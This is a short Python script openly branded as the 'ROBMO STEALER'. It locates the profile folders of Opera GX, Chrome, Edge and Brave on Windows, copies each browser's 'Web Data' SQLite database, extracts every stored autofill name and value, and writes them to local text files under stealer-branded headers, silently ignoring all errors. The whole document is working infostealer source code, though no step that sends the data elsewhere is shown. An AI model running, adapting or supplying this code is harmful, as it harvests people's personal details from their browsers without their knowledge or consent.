import os
import sqlite3
import shutil

intro = """
╔════════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚════════════════════════════════════════════════╝\n
"""

robmo = """═════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════"""

browsers = {
    '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
    '𝐂𝐡𝐫𝐨𝐦𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
    '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default" ),
    '𝐁𝐫𝐚𝐯𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default" )
}

def get_autofill_data(browser_name, browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥_{browser_name}.txt', 'w', encoding='utf-8') as f:
                f.write(intro)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in browsers.items():
    get_autofill_data(browser_name, browser_path)
